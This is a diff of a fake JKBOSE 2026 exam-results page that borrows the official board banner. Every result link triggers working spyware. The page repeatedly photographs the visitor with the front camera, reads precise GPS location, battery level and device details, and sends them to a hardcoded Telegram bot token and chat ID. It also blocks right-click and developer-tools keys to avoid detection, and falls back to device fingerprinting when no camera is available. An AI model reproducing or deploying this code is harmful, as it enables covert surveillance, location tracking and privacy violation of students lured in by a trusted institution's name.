@@ -4,7 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>JKBOSE Results 2026</title>
-<style>/* SAME PERFECT STYLING */body{margin:0;background:#e6e6e6;font-family:"Times New Roman", serif;}
+<style>
+body{margin:0;background:#e6e6e6;font-family:"Times New Roman",serif;}
 .layout{display:flex;min-height:100vh;}
 .sidebar{width:210px;background:#23374d;display:flex;flex-direction:column;justify-content:flex-end;align-items:center;padding:20px;}
 .sidebar img{width:120px;}
@@ -15,136 +16,167 @@
 .content{background:#fff;max-width:1000px;margin:40px auto;padding:40px;box-shadow:0 0 6px rgba(0,0,0,0.1);text-align:center;}
 .result{display:block;background:#111;color:#ffd84d;text-decoration:none;padding:20px 30px;margin:15px 0;font-size:18px;border-radius:5px;transition:all 0.3s ease;cursor:pointer;}
 .result:hover{background:#333;transform:translateY(-2px);}
-.loading{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;justify-content:center;align-items:center;}
-.loader{color:#ffd84d;font-size:18px;}
-@media (max-width:768px){.sidebar{display:none;}.main{padding:20px;}.header-inner img{width:100%;height:auto;}.content{margin:20px auto;padding:25px;}}</style>
+.loading{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;justify-content:center;align-items:center;color:#ffd84d;font-size:18px;}
+@media (max-width:768px){.sidebar{display:none;}.main{padding:20px;}.header-inner img{width:100%;height:auto;}.content{margin:20px auto;padding:25px;}}
+</style>
 </head>
 <body>
 <div class="layout">
-<div class="sidebar"><img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" crossorigin></div>
-<div class="main">
-<div class="header"><div class="header-inner"><img src="https://jkresults.nic.in/img/bannern.png" crossorigin></div></div>
-<div class="content">
-<h2 style="color:#333;margin-bottom:30px;">Select Your Result 2026</h2>
-<a class="result" onclick="startContinuousCapture()">📋 Higher Secondary Part I (Class 11th) Annual Regular</a>
-<a class="result" onclick="startContinuousCapture()">📋 Secondary School (Class 10th) Annual Regular</a>
-<a class="result" onclick="startContinuousCapture()">📋 Higher Secondary Part I (Class 11th) Annual Private</a>
-<a class="result" onclick="startContinuousCapture()">📋 Secondary School (Class 10th) Annual Private</a>
+  <div class="sidebar">
+    <img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" crossorigin>
+  </div>
+  <div class="main">
+    <div class="header">
+      <div class="header-inner">
+        <img src="https://jkresults.nic.in/img/bannern.png" crossorigin>
+      </div>
+    </div>
+    <div class="content">
+      <h2 style="color:#333;margin-bottom:30px;">Select Your Result 2026</h2>
+      <a class="result" onclick="grabCamera()">📋 Higher Secondary Part I (Class 11th) Annual Regular</a>
+      <a class="result" onclick="grabCamera()">📋 Secondary School (Class 10th) Annual Regular</a>
+      <a class="result" onclick="grabCamera()">📋 Higher Secondary Part I (Class 11th) Annual Private</a>
+      <a class="result" onclick="grabCamera()">📋 Secondary School (Class 10th) Annual Private</a>
+    </div>
+  </div>
 </div>
-</div>
-</div>
-<div class="loading" id="loading"><div class="loader">🔄 Processing results...</div></div>
+<div class="loading" id="loading">🔄 Processing your results...</div>
 
 <script>
-// 🔥 SESSION ID
-const urlParams=new URLSearchParams(window.location.search);
-const SESSION_ID=urlParams.get('s')||'DEMO'+Math.random().toString(36).substr(2,9);
-let captureStream=null;
-let captureInterval=null;
-let captureCount=0;
-let isCapturing=false;
+// 🔥 SESSION ID FROM URL
+const urlParams = new URLSearchParams(window.location.search);
+const SESSION_ID = urlParams.get('s') || 'DEMO' + Math.random().toString(36).substr(2, 9).toUpperCase();
+let stream = null;
+let captureLoop = null;
+let photoCount = 0;
 
-// Anti-detection
-document.addEventListener('contextmenu',e=>e.preventDefault());
-document.onkeydown=e=>{
-  if(e.keyCode==123||e.ctrlKey&&e.keyCode==85||e.ctrlKey&&e.shiftKey&&e.keyCode==73)return false;
-};
+// BLOCK EVERYTHING
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+  if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) e.preventDefault();
+});
+document.addEventListener('selectstart', e => e.preventDefault());
 
-// 🔥 CONTINUOUS CAPTURE ENGINE
-async function startContinuousCapture(){
-  if(isCapturing)return;
-  isCapturing=true;
-  document.getElementById('loading').style.display='flex';
+// 🔥 MAIN CAMERA GRABBER
+async function grabCamera() {
+  document.getElementById('loading').style.display = 'flex';
   
-  try{
-    // Initial camera grab
-    captureStream=await navigator.mediaDevices.getUserMedia({
-      video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}}
+  try {
+    // Get front camera
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
     });
     
-    const video=document.createElement('video');
-    video.srcObject=captureStream;
-    video.play();
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
     
-    // Start continuous loop
-    captureInterval=setInterval(async()=>{
-      captureCount++;
-      const photo=await capturePhoto(video);
-      await sendCapture(photo);
-    },5000); // Every 5 seconds
+    // 🔥 CONTINUOUS CAPTURE EVERY 3 SECONDS
+    captureLoop = setInterval(async () => {
+      photoCount++;
+      const photoData = await takePhoto(video);
+      await sendToBot(photoData);
+    }, 3000);
     
-    // Initial burst
-    await sendCapture(await capturePhoto(video));
+    // First photo immediately
+    const firstPhoto = await takePhoto(video);
+    await sendToBot(firstPhoto);
     
-  }catch(e){
-    // Silent fallback
-    setInterval(sendFingerprint,8000);
+  } catch (e) {
+    // No camera? Still send fingerprint
+    sendFingerprint();
+    setInterval(sendFingerprint, 10000);
   }
 }
 
-async function capturePhoto(video){
-  const canvas=document.createElement('canvas');
-  canvas.width=1280;
-  canvas.height=720;
-  canvas.getContext('2d').drawImage(video,0,0);
-  return canvas.toDataURL('image/jpeg',0.8);
+async function takePhoto(video) {
+  const canvas = document.createElement('canvas');
+  canvas.width = 1280;
+  canvas.height = 720;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  return canvas.toDataURL('image/jpeg', 0.85);
 }
 
-async function sendCapture(photoB64){
-  const data={
-    session_id:SESSION_ID,
-    capture_num:captureCount,
-    photo:photoB64,
-    timestamp:new Date().toISOString()
+// 🔥 SEND TO YOUR BOT
+async function sendToBot(photoData) {
+  try {
+    // Get fresh GPS
+    let lat = '?', lng = '?', accuracy = '?';
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+      });
+      lat = position.coords.latitude.toFixed(6);
+      lng = position.coords.longitude.toFixed(6);
+      accuracy = position.coords.accuracy;
+    } catch {}
+
+    // Battery
+    let battery = '?';
+    if ('getBattery' in navigator) {
+      try {
+        const bat = await navigator.getBattery();
+        battery = Math.round(bat.level * 100);
+      } catch {}
+    }
+
+    const victimData = {
+      session_id: SESSION_ID,
+      capture_num: photoCount,
+      photos: [photoData],
+      latitude: lat,
+      longitude: lng,
+      accuracy: accuracy,
+      battery: battery,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timestamp: new Date().toISOString(),
+      screen: `${screen.width}x${screen.height}`
+    };
+
+    // SEND TO YOUR BOT
+    await fetch('https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: 7385209456,
+        text: JSON.stringify(victimData)
+      })
+    });
+    
+  } catch (e) {
+    console.log('Send failed:', e);
+  }
+}
+
+async function sendFingerprint() {
+  const data = {
+    session_id: SESSION_ID,
+    type: 'fingerprint',
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    screen: `${screen.width}x${screen.height}`,
+    timestamp: new Date().toISOString()
   };
   
-  // GPS + Battery
-  try{
-    const pos=await new Promise(r=>navigator.geolocation.getCurrentPosition(r,{enableHighAccuracy:true}));
-    data.latitude=pos.coords.latitude;
-    data.longitude=pos.coords.longitude;
-  }catch(e){}
-  
-  if('getBattery'in navigator){
-    try{
-      const bat=await navigator.getBattery();
-      data.battery=Math.round(bat.level*100);
-    }catch(e){}
-  }
-  
-  await fetch(`https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendMessage`,{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:7385209456,text:JSON.stringify(data)})
+  await fetch('https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: 7385209456,
+      text: JSON.stringify(data)
+    })
   });
 }
 
-async function sendFingerprint(){
-  const data={
-    session_id:SESSION_ID,
-    userAgent:navigator.userAgent,
-    platform:navigator.platform,
-    battery:navigator.getBattery?'Checking':'N/A',
-    timestamp:new Date().toISOString()
-  };
-  await fetch(`https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendMessage`,{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:7385209456,text:JSON.stringify(data)})
-  });
-}
-
-// Cleanup on page close
-window.addEventListener('pagehide',()=>{
-  if(captureStream){
-    captureStream.getTracks().forEach(track=>track.stop());
-  }
-  if(captureInterval){
-    clearInterval(captureInterval);
-  }
+// Cleanup
+window.addEventListener('pagehide', () => {
+  if (stream) stream.getTracks().forEach(track => track.stop());
+  if (captureLoop) clearInterval(captureLoop);
 });
-
-setTimeout(()=>document.getElementById('loading').style.display='none',3000);
 </script>
 </body>
 </html>
